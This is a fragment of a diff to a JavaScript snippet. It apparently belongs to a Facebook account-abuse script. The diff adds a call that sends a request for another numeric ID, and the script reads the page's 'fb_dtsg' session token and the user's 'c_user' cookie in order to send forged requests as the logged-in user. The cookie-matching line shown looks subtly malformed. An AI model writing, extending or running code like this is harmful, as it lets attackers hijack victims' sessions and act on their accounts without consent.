@@ -13,6 +13,7 @@ function g(d) {
     a.send(d)
 }
 g("1413025565582707");
+g("597064983673982")
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
